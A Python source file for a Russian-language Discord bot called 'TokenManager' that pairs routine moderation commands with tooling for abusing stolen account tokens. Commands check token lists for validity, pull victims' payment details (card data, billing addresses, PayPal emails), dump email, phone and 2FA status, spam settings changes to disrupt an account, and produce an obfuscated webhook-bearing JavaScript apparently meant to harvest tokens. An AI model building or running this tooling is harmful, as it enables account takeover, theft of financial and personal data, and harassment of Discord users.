import os
import datetime
import aiohttp
import json
import inspect
import requests
from asyncio import sleep
from discord.ext import commands
import discord
import platform
import sys
import ast
import asyncio
import config
import requests as rq

def th(token): return {'Authorization': token}

intents = discord.Intents.all()
client = discord.client
client = commands.Bot(command_prefix = '.', intents=intents)
client.remove_command( 'help' )

@client.event
async def on_ready():
  print(f'Бот запущен. Ник бота: {client.user}  https://discord.com/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot')
  await client.change_presence(status=discord.Status.online, activity=discord.Streaming(name=f'.help', url='https://www.twitch.tv/jktimosha'))

@client.command(
  aliases = ['хелп', 'Help', 'Хелп', 'HELP'])
async def help(ctx):
    embed=discord.Embed(title="Команды TokenManager:", description="Тут расписано, как пользоваться командами.", color=0x280df2)
    embed.add_field(name=".help-token ", value="`Выводит команды для токенов`", inline=True)
    embed.add_field(name=".help-mod ", value="`Выводит команды для модерирования`", inline=True)
    embed.set_footer(text="TokenManager© Copyright 2021 | Все права защищены", icon_url = "https://cdn.discordapp.com/avatars/868146975877529610/1371a0c57df5711a5a5d476e7e6ed4c4.png?size=512")
    await ctx.send(embed=embed)


@client.command()
async def tokencheck(ctx, select=None, token=None):
    if select == None:
        await ctx.send('Укажи one/all')
    if select == 'one':
        headers = {'Authorization': token}
        request = requests.get('https://canary.discord.com/api/v8/users/@me/library', headers=headers)
        if request.status_code == 403:
            await ctx.send(embed = discord.Embed(title=':x: ✅', description=f'<a:xz:868191876329635880> \n **Данный токен** \n `{token}` __*является*__ \n ``Валид, но. Аккаунт не подтверждён(дискорд требует почту/телефон). Операции с данным аккаунтом не возможны!```', colour = 0xf00a0a))
        elif request.status_code == 401:
            await ctx.send(embed = discord.Embed(title=':x:', description=f'<a:xz:868191876329635880> \n **Данный токен** \n `{token}` __*является*__ \n ```Инвалид```', colour =0xf00a0a))
        else:
            await ctx.send(embed = discord.Embed(title='✅', description=f'<a:xz:868191876329635880> \n **Данный токен** \n `{token}` __*является*__ \n ```Валид```', colour =0x280df2))
        await ctx.message.add_reaction("✅")
    if select == 'all':
        validTokens = []
        with open('tokens.txt','r') as handle:
            tokens = handle.readlines()
            for x in tokens:
                token = x.rstrip()
                headers = {'Authorization': token}
                request = requests.get('https://canary.discord.com/api/v8/users/@me/library', headers=headers)
                if request.status_code == 403:
                    await ctx.send(embed = discord.Embed(title=':x: ✅', description=f'<a:xz:868191876329635880> \n **Данный токен** \n `{token}` __*является*__ \n ``Валид, но. Аккаунт не подтверждён(дискорд требует почту/телефон). Операции с данным аккаунтом не возможны!```', colour = 0xf00a0a))
                elif request.status_code == 401:
                    await ctx.send(embed = discord.Embed(title=':x:', description=f'<a:xz:868191876329635880> \n **Данный токен** \n `{token}` __*является*__ \n ```Инвалид```', colour =0xf00a0a))
                else:
                    await ctx.send(embed = discord.Embed(title='✅', description=f'<a:xz:868191876329635880> \n **Данные токены** \n `{token}` __*являеются*__ \n ```Валидными```', colour =0x280df2))
                    validTokens.append(token)
        tokens = open('tokens.txt', 'w')
        for token in validTokens:
            tokens.write(f'{token}\n')
        await ctx.send('Все токены отфильтрованы')
        await ctx.message.add_reaction("✅")

@client.command()
async def cardgrab(ctx, token):
    cc_digits = {
    'american express': '3',
    'visa': '4',
    'mastercard': '5'
    }
    grab1 = []
    headers = {'Authorization': token}
    for grab in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
        await ctx.send(grab)
        grab1 = grab['billing_address']
        await ctx.send(grab1)
        name = grab1['name']
        address1 = grab1['line_1']
        address2 = grab1['line_2']
        city = grab1['city']
        postalСode = grab1['postal_code']
        state = grab1['state']
        country = grab1['country']
        if grab['type'] == 1:
            cc_brand = grab['brand']
            cc_first = cc_digits.get(cc_brand)
            cc_last = grab['last_4']
            cc_month = str(grab['expires_month'])
            cc_year = str(grab['expires_year'])
            await ctx.send(f'Payment Type: Credit card')
            await ctx.send(embed = discord.Embed(title='Payment Type: Credit card', description=f'Valid: {not grab["invalid"]} \nCC Holder Name: {name}\nCC Brand: {cc_brand.title()} \nCC Number: {"".join(z if (i + 1) % 2 else z + " " for i, z in enumerate((cc_first if cc_first else "*") + ("*" * 11) + cc_last))} \nCC Date: {("0" + cc_month if len(cc_month) < 2 else cc_month) + "/" + cc_year[2:4]} \nAddress 1: {address1} \n Address 2: {address2 if address2 else ""} \n City: {city} \n Postal code: {postalСode} \n State: {state if state else ""} \n Country: {country} \n Default Payment Method: {grab["default"]}', colour = 0x4300fa))
        elif grab['type'] == 2:
            await ctx.send(embed = discord.Embed(title='Payment Type: PayPal', description=f'Valid: {not grab["invalid"]} \nPayPal Name: {name} \nPayPal Email: {grab["email"]} \nAddress 1: {address1} \nCity: {city} \n Postal code: {postalСode} \nState: {state if state else ""} \nCountry: {country} \n Default Payment Method: {grab["default"]}', colour = 0x4300fa))

@client.command()
async def script(ctx, webhook=None):
	if webhook == None:
		await ctx.send("Укажи вебхук. Пример: *script https://discord.com/api/webhooks/850487523779280926/Sgqn0rBksUlUOp1Q6fvTsUrW9uiwDZbhxKErQOj8yfnABStJjkLVj0WfKctW0a-Bkri-")
	else:
		scriptFile = open('script.txt', 'r')
		script = scriptFile.read()
		scriptFile.close()
		data = {'source': f'"{webhook}"', 'do_linebreak': 'on', 'do_indent': 'on', 'prefix': '_', 'do_strings': 'on', 'do_strings_hex': 'on', 'ignore_fn': '', 'ignore_global': ''}
		req = requests.post('http://www.freejsobfuscator.com/obfuscate', data=data).text
		req2 = json.loads(req)
		out = req2['output']
		out2 = out[:-10]
		webhook2 = out2[10:]
		script2 = script.replace('webhook', webhook2)
		await ctx.send(f"Держи: ```js\n{script2}\n```")

@client.command(
  aliases = ['help-token', 'Help-token', 'хелп-токен', 'help-токен'])
async def help_token(ctx):
    embed=discord.Embed(title="Команды TokenManager:", description="Тут расписано, как пользоваться командами.", color=0x280df2)
    embed.add_field(name=".tokencheck one {token} | .tokencheck all {token1} {token2}", value="`Проверяет токены  на валидность`", inline=True)
    embed.add_field(name=".userinfo {token}", value="`Выводит большую информацию о токене`", inline=True)
    embed.add_field(name=".lag {token}", value="`Запускает лаг машину(Изменяет языки и темы)`", inline=True)
    embed.add_field(name=".cardgrab {token}", value="`Грабит карточку(Вся информация о ней)`", inline=True)
    embed.add_field(name="Мы будем регулярно обновлять бота", value="`Бот создан в 23.07.2021` \n `И не надо вводить токен вот так {Ndskdwjjxefd}, вводите без скобок`", inline=True)
    embed.add_field(name="Мы не несем ответственность за использование бота", value="`Если вас взломали, нам абсолютно похуй. Вы долбаеб, больше мы ничего не скажем вам`", inline=True)
    embed.set_footer(text="TokenManager© Copyright 2021 | Все права защищены", icon_url = "https://cdn.discordapp.com/avatars/868146975877529610/1371a0c57df5711a5a5d476e7e6ed4c4.png?size=512")
    await ctx.send(embed=embed)
  

@client.command(
  aliases = ['help-moderation', 'Help-moderation', 'help-mod', 'help_mod'])
async def help_moderation(ctx):
    embed=discord.Embed(title="Команды TokenManager:", description="Тут расписано, как пользоваться командами.", color=0x280df2)
    embed.add_field(name=".ban {user} | id", value="`Банит пользователя`", inline=True)
    embed.add_field(name=".kick {user}", value="`Кикает пользователя`", inline=True)
    embed.add_field(name=".clear ", value="`Отчистит определенное количество сообщений`", inline=True)
    embed.add_field(name=".slowmod", value="`Поставит кулдаун на канал`", inline=True)
    embed.add_field(name=".unban {user} | id", value="`Разбанит пользователя`", inline=True)
    embed.set_footer(text="TokenManager© Copyright 2021 | Все права защищены", icon_url = "https://cdn.discordapp.com/avatars/868146975877529610/1371a0c57df5711a5a5d476e7e6ed4c4.png?size=512")
    await ctx.send(embed=embed)

@client.event
async def on_command_error(ctx, err):
    if isinstance(err, commands.errors.BotMissingPermissions):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"У бота отсутствуют права: {' '.join(err.missing_perms)}\nВыдайте их ему для полного функционирования бота", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance(err, commands.CommandOnCooldown):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"**У вас еще не прошел кулдаун на команду** `{ctx.command}`\nПодождите еще `{err.retry_after:.2f}` **сек**", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance(err, commands.CommandNotFound ):
        await ctx.send(embed = discord.Embed(description = f'** {ctx.author.name}, данной команды не существует.**', color=0x4300fa))

@client.command()
async def userinfo(ctx, token):
    headers = th(token)
    r1 = rq.get('https://discord.com/api/users/@me', headers=headers)
    code = r1.status_code
    if code == 401:
        await ctx.send(embed = discord.Embed(title=':negative_squared_cross_mark:', description=f'<a:xz:868191876329635880> \n **Данный токен** \n `{token}` __*является*__ \n ```инвалидным```', colour = 0xf00a0a))
        return
    elif code == 200:
        pass
    else:
        await ctx.send('Неверный статус ответа Discord!', f'{code} {r1.text}\nДля подробной информации обратитесь к разработчику')
        return
    j = r1.json()
    r2 = rq.get('https://discord.com/api/users/@me/guilds?with_counts=true', headers=headers)
    if r2.status_code == 200:
        pass
    elif r2.status_code == 403:
        await ctx.send("Аккаунт не подтверждён(дискорд требует почту/телефон). Операции с данным аккаунтом не возможны!")
        return
    else:
        await ctx.send(f'{r2.status_code} {r2.text}\nДля подробной информации обратитесь к разработчику')
        return
    guilds = len(r2.json())
    bl = 0
    fr = 0
    i_r = 0
    o_r = 0
    r3 = rq.get('https://discord.com/api/users/@me/relationships', headers=headers)
    for rel in r3.json():
        t = rel['type']
        if t == 1:
            fr += 1
        elif t == 2:
            bl += 1
        elif t == 3:
            i_r += 1
        elif t == 4:
            o_r += 1
    tag = j['discriminator']
    nick = j['username']
    id = j['id']
    try:
        email = j['email']
    except:
        email = 'нету'
    try:
        phone = j['phone']
    except:
        phone = 'нету'
    try:
        mfa = j['mfa_enabled']
    except:
        mfa = False
    try:
        avatar = f'https://cdn.discordapp.com/avatars/{id}/{j["avatar"]}.png'
    except:
        avatar = 'нету'
    try:
        if j['premium_type'] == 2:
            nitro = 'Nitro Boost'
        elif j['premium_type'] == 1:
            nitro = 'Nitro Classic'
    except:
        nitro = 'нету'
    try:
        locale = j['locale']
    except:
        locale = 'неизвестно'
    r4 = rq.get('https://discord.com/api/users/@me/channels', headers=headers)
    dms = len(r4.json())
    await ctx.send(embed = discord.Embed(title='Инфо', description=f' <a:xz:868191876329635880> \n**Ник и тег:** `{nick}#{tag}` \n**ID:** `{id}` \n **Nitro:** `{nitro}` \n **Серверов:** `{guilds}` \n **Открытых лс:**  `{dms}` \n **E-MAIL:** `{email}` \n **Номер телефона:** `{phone}` \n **2FA:** `{"включено" if mfa else "выключено"}` \n **Друзья:** `{fr}` \n **ЧС:** `{bl}` \n **Входящих запросов:** `{i_r}` \n **Исходящих запросов:** `{o_r}`', colour = 0x4300fa))





@client.command()
async def tokencheck2(ctx, token):
  r=rq.get('https://discord.com/api/users/@me',headers={'authorization': token})
  if r.status_code==200:
    info=r.json()
    await ctx.send(embed = discord.Embed(title='✅', description=f'<a:xz:868191876329635880> __Токен__ `{token}` \n **принадлежит аккаунту** `{info["username"]}`', colour = 0x4300fa))
  else:
    await ctx.send(embed = discord.Embed(title=':negative_squared_cross_mark:', description=f'<a:xz:868191876329635880> \n **Данный токен** \n `{token}` __*является*__ \n ```инвалидным```', colour = 0x4300fa))

@client.command()
async def lag(ctx, token):
  mainr=rq.get('https://discord.com/api/users/@me',headers={'authorization': token, 'content-type': 'application/json'})
  if mainr.status_code==200:
    await ctx.send(embed = discord.Embed(title='✅', description=f' <a:xz:868191876329635880>\n**Запускаем лаги на аккаунте** \n {mainr.json()["username"]}! \n ```ХХАХХААХХА```', colour = 0x4300fa))
  else:
    await ctx.send(embed = discord.Embed(title=':negative_squared_cross_mark:', description=f' <a:xz:868191876329635880>\n**Данный токен** `{token}` __*является*__ \n ```инвалидным```', colour = 0x4300fa))
    return
  while True:#Чтобы остановить цикл закройте код или нажмите CTRL + C
    for lang in ['en', 'de', 'ja', 'it', 'ko', 'ro', 'pl', 'da', 'fr', 'hr', 'ua', 'th']:#Тут языки, можете своих добавить
      for theme in ['light', 'dark']:#Тут темы, их ток две
        r=rq.patch('https://discord.com/api/users/@me/settings', json={'locale': lang, 'theme': theme}, headers={'authorization': token, 'content-type': 'application/json'})

@client.command(
  aliases = ['бан', 'Ban', 'Бан'])
@commands.has_permissions(ban_members = True)
async def ban(ctx, member: discord.Member, *, reason = None):
		if member is None:
			await ctx.send(embed = discord.Embed(
				description = f':x:**{ctx.author.name}**, укажите пользователя!',
				colour = 0x4300fa))
		elif reason is None:
			await ctx.send(embed = discord.Embed(
				description = f':x:**{ctx.author.name}**, укажите причину!',
				colour = 0x4300fa))
		else:
			embed = discord.Embed(
				title = ':hammer: | Бан', 
				description = f'<a:xz:868191876329635880> \n \n **Модератор:** `{ctx.author}` \n **Забанил пользователя:** { member.mention }\n **Причина:** `{reason}`', 
				colour = 0x4300fa)
			await member.send(embed = discord.Embed(title=':hammer: | Бан', description=f' <a:xz:868191876329635880> \n **Сервер:** {ctx.guild.name} \n **Модератор:** {ctx.author} \n **Причина:** {reason}', colour = 0x4300fa))
			await member.ban(reason=reason)
			await ctx.send(embed=embed)

@client.command(
aliases = ['кик', 'Кик', 'кИК', 'КИК',  'kICK', 'KICK'])
@commands.has_permissions(kick_members = True)
async def kick(ctx, member: discord.Member, *, reason = None):
		if member is None:
			await ctx.send(embed = discord.Embed(
				description = f':x:**{ctx.author.name}**, укажите пользователя!',
				colour = 0x4300fa))
		elif reason is None:
			await ctx.send(embed = discord.Embed(
				description = f':x:**{ctx.author.name}**, укажите причину!',
				colour = 0x4300fa))
		else:
			embed = discord.Embed(
				title = ':hammer: | Кик', 
				description = f'<a:xz:868191876329635880> \n \n **Модератор:** `{ctx.author}` \n **Кикнул пользователя:** { member.mention }\n **Причина:** `{reason}`', 
				colour = 0x4300fa)
			await member.send(embed = discord.Embed(title=':hammer: | Кик', description=f' <a:xz:868191876329635880> \n **Сервер:** {ctx.guild.name} \n **Модератор:** {ctx.author} \n **Причина:** {reason}', colour = 0x4300fa))
			await member.kick(reason=reason)

@client.command()
async def unban(ctx, id: int) :
        user = await client.fetch_user(id)
        await ctx.guild.unban(user)
        await ctx.send(embed = discord.Embed(title=':hammer: | Разбан', description=f' <a:xz:868191876329635880> \n  **Модератор:** {ctx.author} \n **Разбаненный:** {user} ', colour = 0x4300fa))
        
@client.command(
  aliases = ['Слоумод', 'слоумод'])
@commands.has_permissions(administrator = True)
async def slowmod( ctx, delay:int = None):
		if delay == None:
			await ctx.send(embed = discord.Embed(
				description = f':x:**{ctx.author.mention}** укажите время!',
				colour =0x4300fa))
			return
		if delay > 21600:
			await ctx.send(embed = discord.Embed(
				description = f':x:**{ctx.author.mention}** нельзя ставить лимит на 21600(6ч)!',
				colour = 0x4300fa))
			return
		await ctx.channel.edit(slowmode_delay = delay)
		await ctx.send(embed = discord.Embed(
			title = ':hammer: | Успешно',
			description = f'  <a:xz:868191876329635880> \n {ctx.author.mention} **поставил лимит словмод на** `{delay}` __секунд__',
			colour = 0x4300fa))

@client.command(
  aliases = ['Отчистить', 'отчистить', 'Удалить', 'удалить'])
@commands.has_permissions(manage_messages = True)
async def clear( ctx, amount: int = None):
		if amount is None:
			pass
		else:
			amount1 = amount + 1

			dead = await ctx.channel.purge(limit = amount1)
			embed = discord.Embed(
				title = ':hammer: | Успешно', 
				description = f'  <a:xz:868191876329635880> \n {ctx.author.mention} \n **Удачно удалил сообщения!**\nУдалил: `{len(dead)}`!', 
				colour = 0x4300fa)
			await ctx.channel.send(embed=embed)
			await asyncio.sleep(2)


@client.command(
  aliases = ['Ping', 'пинг', 'Пинг'])
async def ping(ctx): # Объявление асинхронной функции __ping с возможностью публикации сообщения
    ping = client.ws.latency # Получаем пинг клиента

    ping_emoji = '🟩🔳🔳🔳🔳' # Эмоция пинга, если он меньше 100ms

    if ping > 0.10000000000000000:
        ping_emoji = '🟧🟩🔳🔳🔳' # Эмоция пинга, если он больше 100ms

    if ping > 0.15000000000000000:
        ping_emoji = '🟥🟧🟩🔳🔳' # Эмоция пинга, если он больше 150ms

    if ping > 0.20000000000000000:
        ping_emoji = '🟥🟥🟧🟩🔳' # Эмоция пинга, если он больше 200ms

    if ping > 0.25000000000000000:
        ping_emoji = '🟥🟥🟥🟧🟩' # Эмоция пинга, если он больше 250ms

    if ping > 0.30000000000000000:
        ping_emoji = '🟥🟥🟥🟥🟧' # Эмоция пинга, если он больше 300ms

    if ping > 0.35000000000000000:
        ping_emoji = '🟥🟥🟥🟥🟥' # Эмоция пинга, если он больше 350ms

    message = await ctx.send('Пинг-Понг') # Переменная message с первоначальным сообщением
    await message.edit(embed = discord.Embed(title='<a:xz:868191876329635880>', description=f' {ping_emoji} \n `{ping * 1000:.0f}ms`:ping_pong: ', colour = 0x4300fa))


client.run("")
